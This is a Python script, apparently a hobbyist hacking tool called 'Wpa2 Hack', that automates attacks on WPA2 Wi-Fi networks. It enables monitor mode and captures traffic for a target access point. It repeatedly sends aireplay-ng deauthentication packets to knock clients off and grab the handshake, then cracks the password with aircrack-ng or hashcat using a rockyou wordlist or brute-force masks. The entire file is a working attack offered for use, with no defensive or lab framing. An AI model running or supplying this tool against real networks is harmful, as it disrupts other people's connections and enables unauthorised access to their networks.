from os import popen ,mkdir ,chdir ,getcwd
from subprocess import PIPE, Popen
import re
from os import system as cmd 
from termcolor import *
from time import sleep
from platform import platform
from sys import stdout
from sys import exit



def banner1():
  
        print(green+"""
 █     █░ ██▓  █████▒██▓ ▄▄▄       ██ ▄█▀ ▄▄▄▄    ██▓    ▄▄▄       ▄████▄   ██ ▄█▀
▓█░ █ ░█░▓██▒▓██   ▒▓██▒▒████▄     ██▄█▒ ▓█████▄ ▓██▒   ▒████▄    ▒██▀ ▀█   ██▄█▒ 
▒█░ █ ░█ ▒██▒▒████ ░▒██▒▒██  ▀█▄  ▓███▄░ ▒██▒ ▄██▒██░   ▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ 
░█░ █ ░█ ░██░░▓█▒  ░░██░░██▄▄▄▄██ ▓██ █▄ ▒██░█▀  ▒██░   ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ 
░░██▒██▓ ░██░░▒█░   ░██░ ▓█   ▓██▒▒██▒ █▄░▓█  ▀█▓░██████▒▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄
░ ▓░▒ ▒  ░▓   ▒ ░   ░▓   ▒▒   ▓▒█░▒ ▒▒ ▓▒░▒▓███▀▒░ ▒░▓  ░▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒
  ▒ ░ ░   ▒ ░ ░      ▒ ░  ▒   ▒▒ ░░ ░▒ ▒░▒░▒   ░ ░ ░ ▒  ░ ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░
  ░   ░   ▒ ░ ░ ░    ▒ ░  ░   ▒   ░ ░░ ░  ░    ░   ░ ░    ░   ▒   ░        ░ ░░ ░ 
    ░     ░          ░        ░  ░░  ░    ░          ░  ░     ░  ░░ ░      ░  ░   
                                               ░                  ░               
           /_/                                                      
"""+colored("		Coded BY",'red')+green+":Ahmed:Kamal")
        print('FB https://web.facebook.com/ahmedbalaha15485')
        print('github https://github.com/HackCode0x1')
	

        sleep(2)

def banner():
  print(cyan+"--------------------------------------------------------------------------------------------------")
  print(green+"            	        	~~~~~~  Wpa2 Hack ~~~~~~"+white)    
  print(cyan+"--------------------------------------------------------------------------------------------------"+white)
  print()


def Color():
        global red,green , yellow , blue ,\
        cyan,white, p ,bg , underline
        ###############################
        green , yellow ,blue ,red,white = '\033[92m' ,'\033[93m' , '\033[94m' , '\033[91m','\x1b[37m'
        ###########################################################################################
        p ,cyan ,bg,underline = '\x1b[35m' , '\x1b[36m' , '\033[0m',"\033[4m"
        ########################################################################
        global good , bad , ast
        ######################################################################
        good,bad ,ast = green+'[+]'+white , red+'[-]'+white , green+'[*]'+white
        #######################################################################


def Get_interfaces():
	try:
		cmd("clear")
		banner1()
		banner()
		global interface , mointormode
		print(ast,"Detacting Interfcaes")
		cmd('sleep 2')
		Get_int = cmd("airmon-ng | grep w | awk '{print $2}'  > wlan.txt")


		    
		   		

		wlans = open('wlan.txt','r')
		read_wlan = wlans.readlines()
		print()
		mointormode='wlan0'
		for init in read_wlan:
			print("(%d)"%(read_wlan.index(init)+1),green+init+white,end="")
		print()
		cmd('clear')
		banner()
		mon = popen("airmon-ng | grep mon | awk '{print $1}'").read().strip("\n")
		cmd('clear')
		banner()
		cmd('clear')
		banner()
		print(green+"Start Mointor Mode On {}".format(mointormode))
		popen("airmon-ng start {} >/dev/null 2>&1".format(mointormode)).read()
		

	except KeyboardInterrupt:
			print()
			print(good,white+"[CTRL+C] PRESSED.... ")

			print()
			print("Quiting...")
			sleep(1)
			cmd("clear")
			exit()

		
	


def AP_Search():

	global bssid , channel ,Cap , dirctory
	dirctory = "Handshakes"
	cmd('rm -rf  {} '.format(dirctory))
	mkdir('{}'.format(dirctory))
	
	chdir(dirctory)
	
	print(ast,'Press CTRL+C To Stop ')
	sleep(2)


	cmd('airodump-ng {} '.format(mointormode))

	for i in range(40):
		print(green+'+'+white,end="")
		stdout.flush()
		sleep(0.0090)
	print()
	print(ast,cyan+"Insert Bssid"+white)
	banner()
	print()
	bssid = input(red+">> "+white)
	

	print()
	for i in range(40):
		print(green+'+'+white,end="")
		stdout.flush()
		sleep(0.0090)
	print()	
	print(ast,cyan+"Insert Channel "+white)
	print()
	channel = input(red+'>> '+white)
	cmd('clear')

	Cap = "Handshake"
	cmd('xterm -e airodump-ng -c {} --bssid {} -w {} {} >/dev/null 2>&1 & '.format(channel,bssid,Cap,mointormode))

	
			


def Get_Handshake():
	global Cap 
	Cap = Cap+"-01.cap"
	banner()
	print(blue+"Start Deauthentication Attack Aireplay"+white)

	print()
	banner()
	print(green+"Geting Handshake .... "+white,end="") 
	while True:
		Deauth = "xterm -fg red -e aireplay-ng  -0 6 -a  {} {} >/dev/null 2>&1".format(bssid, mointormode)
		cmd(Deauth)
		sleep(3)
		veri_handshake = cmd(" cowpatty -c -r {} >/dev/null 2>&1".format(Cap))
		if veri_handshake==0:
			print(green+"Done ")
			print()
			cmd('pkill airodump-ng')
			cmd("clear")
			break
	
		  


	
	


def Crack():
	banner()
	print(green+"""[1] Crack With Rockyou Aircrack-ng
[2] Crack With Hashcat Rockyou
[3] Crack With Brute-Force Attack
"""+white)

	Crack = int(input(red+"[~]"+cyan+"> "+white))
	if Crack ==1:
		wordlists ="rockyou.txt"
		scrack ="aircrack-ng -w {}  {} ".format(wordlists,Cap)
		cmd(scrack)
	elif Crack ==2:
	  HahscatRockYou()
	  
	  
	  
	elif Crack==3:
	  Bruteforce()
		




def HahscatRockYou():
	global hccap_path
	cmd("clear")
	banner()
	print(good,"Convert Cap File....",end="")
	cmd("aircrack-ng -J convert {} >/dev/null 2>&1".format(Cap))
	sleep(1)
	print(green+"[OK]",end=""+white)
	print()
	hccap = "convert.hccap"
	Dir = getcwd()
	hccap_path = Dir+"/"+hccap
	chdir('../')
	Dir = getcwd()
	Password_List = Dir+"/"+"rockyou.txt"
	cmd("clear")
	cmd("hashcat -m 2500 {} {} ".format(hccap_path,Password_List))
	






def Bruteforce():
  cmd('clear')
  banner()
  print(ast,green+"Convering Cap File"+white)
  converrt = "xterm -e aircrack-ng  -J convert {} >/dev/null 2>&1 ".format(Cap)
  cmd("clear")
  cmd(converrt)
  banner()
  
  print(colored("""
Numbered passwords   						    (?d?d?d?d?d?d?d?d)
Letter passwords All uppercase   				    (?u?u?u?u?u?u?u?u)
Letter passwords All lowercase    				    (?l?l?l?l?l?l?l?l)
Passwords Lowercase letters and numbers  			    (?l?d?l?d?l?d?l?d)
Passwords Uppercase letters and numbers  			    (?u?d?u?d?u?d?u?d)
Passwords Mixed uppercase, lowercase, number + special characters   (?a?a?a?a?a?a?a?a)
    """,'red'))
  print(green+"Insert Mask")
  print("--------------------------------------")
  print()
  sh = green+"["+cyan+"~"+green+"]"+colored("$ ",'red')
  
  mask = input(sh)
  
  cmd("clear") 
  cmd("hashcat -m 2500 {} {} ".format(hccap_path,mask))
  
  
	      


Color()
Get_interfaces()
AP_Search()
Get_Handshake()
Crack()


